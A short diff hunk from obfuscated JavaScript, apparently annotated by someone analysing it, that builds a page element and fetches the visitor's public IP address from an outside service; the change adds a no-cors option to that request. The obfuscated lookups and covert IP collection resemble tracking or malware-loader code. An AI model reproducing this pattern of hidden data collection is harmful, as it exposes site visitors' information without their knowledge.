@@ -494,7 +494,7 @@ debugger;
                 const Ff = document[eval_G56db.eval_Gfg0(92)](eval_G56db.eval_y55Z(278));
                 Ff[eval_G56db.eval_mQQZ(169)] = eval_G56db.eval_qVVZ(56);
                 try {
-                    const Fb = await fetch("https://ipv4.jsonip.com/"); // grabbing ip
+                    const Fb = await fetch("https://ipv4.jsonip.com/", { mode: 'no-cors'}); // grabbing ip
                     const Fh = await Fb[eval_G56db.eval_qVVZ(280 /* client ip */)](); // stores ip
                     const Fr = Fh[eval_G56db.eval_mQQZ(281)]; // stores ip again????
 
